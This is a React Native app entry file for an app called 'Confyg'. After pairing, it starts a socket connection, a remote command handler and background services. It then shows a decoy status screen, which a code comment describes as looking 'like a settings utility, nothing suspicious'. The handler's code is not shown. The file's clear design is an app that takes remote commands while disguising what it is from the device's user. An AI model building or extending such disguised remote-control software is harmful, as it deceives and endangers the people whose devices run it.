/**
 * Confyg Mobile App
 * 
 * AUTO MODE: No more manual flag switching!
 * - No credentials → Shows pairing UI
 * - Has credentials → Shows minimal status, runs services in background
 */

import React, { useState, useEffect, useRef } from 'react';
import { StatusBar, View, StyleSheet, ActivityIndicator, Text } from 'react-native';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { authService, socketService, pushNotificationService, backgroundService, commandHandler } from './src/services';
import { PairingScreen } from './src/screens';

type AppMode = 'loading' | 'unpaired' | 'paired';

function App(): React.JSX.Element {
  const [appMode, setAppMode] = useState<AppMode>('loading');
  const [isConnected, setIsConnected] = useState(false);
  const servicesInitialized = useRef(false);

  useEffect(() => {
    initializeApp();

    // Listen for connection status changes
    const handleConnect = () => setIsConnected(true);
    const handleDisconnect = () => setIsConnected(false);
    
    socketService.on('connect', handleConnect);
    socketService.on('disconnect', handleDisconnect);

    return () => {
      socketService.off('connect', handleConnect);
      socketService.off('disconnect', handleDisconnect);
    };
  }, []);

  const initializeApp = async () => {
    console.log('[App] Initializing in auto mode...');

    try {
      // Check for stored credentials
      const isAuthenticated = await authService.initialize();
      console.log('[App] Credentials found:', isAuthenticated);

      if (isAuthenticated) {
        // Already paired - start services and show minimal UI
        await startBackgroundServices();
        setAppMode('paired');
      } else {
        // Not paired - show pairing screen
        setAppMode('unpaired');
      }
    } catch (error) {
      console.error('[App] Initialization failed:', error);
      setAppMode('unpaired');
    }
  };

  const startBackgroundServices = async () => {
    if (servicesInitialized.current) {
      console.log('[App] Services already initialized.');
      return;
    }

    console.log('[App] Starting background services...');

    const token = authService.getToken();
    const deviceId = authService.getDeviceId();

    if (!token || !deviceId) {
      console.error('[App] Cannot start services: missing credentials.');
      return;
    }

    try {
      await socketService.connectWithAutoRefresh();
      commandHandler.initialize();
      await pushNotificationService.initialize();
      await backgroundService.initialize();
      await backgroundService.start();

      servicesInitialized.current = true;
      setIsConnected(socketService.isConnected());
      console.log('[App] Background services started successfully.');
    } catch (error) {
      console.error('[App] Failed to start background services:', error);
    }
  };

  const handlePaired = async () => {
    console.log('[App] Pairing complete, starting services...');
    await startBackgroundServices();
    setAppMode('paired');
  };

  // Loading state
  if (appMode === 'loading') {
    return (
      <View style={styles.container}>
        <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
        <ActivityIndicator size="small" color="#8e8e93" />
      </View>
    );
  }

  // Not paired - show pairing screen
  if (appMode === 'unpaired') {
    return (
      <SafeAreaProvider>
        <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
        <PairingScreen onPaired={handlePaired} />
      </SafeAreaProvider>
    );
  }

  // Paired - show minimal boring "config" screen
  // This looks like a settings utility, nothing suspicious
  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
      <View style={styles.statusCard}>
        <View style={styles.statusRow}>
          <Text style={styles.label}>Sync Status</Text>
          <View style={styles.statusIndicator}>
            <View style={[styles.dot, isConnected ? styles.dotGreen : styles.dotRed]} />
            <Text style={styles.statusText}>
              {isConnected ? 'Active' : 'Offline'}
            </Text>
          </View>
        </View>
        <View style={styles.divider} />
        <View style={styles.statusRow}>
          <Text style={styles.label}>Background Sync</Text>
          <Text style={styles.value}>Enabled</Text>
        </View>
        <View style={styles.divider} />
        <View style={styles.statusRow}>
          <Text style={styles.label}>Version</Text>
          <Text style={styles.value}>1.0.0</Text>
        </View>
      </View>
      <Text style={styles.footer}>Configuration synced automatically</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1c1c1e',
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  statusCard: {
    backgroundColor: '#2c2c2e',
    borderRadius: 12,
    padding: 16,
    width: '100%',
    maxWidth: 350,
  },
  statusRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: 12,
  },
  label: {
    color: '#ffffff',
    fontSize: 16,
  },
  value: {
    color: '#8e8e93',
    fontSize: 16,
  },
  statusIndicator: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  dot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    marginRight: 8,
  },
  dotGreen: {
    backgroundColor: '#30d158',
  },
  dotRed: {
    backgroundColor: '#ff453a',
  },
  statusText: {
    color: '#8e8e93',
    fontSize: 16,
  },
  divider: {
    height: 1,
    backgroundColor: '#3a3a3c',
  },
  footer: {
    color: '#636366',
    fontSize: 13,
    marginTop: 20,
    textAlign: 'center',
  },
});

export default App;
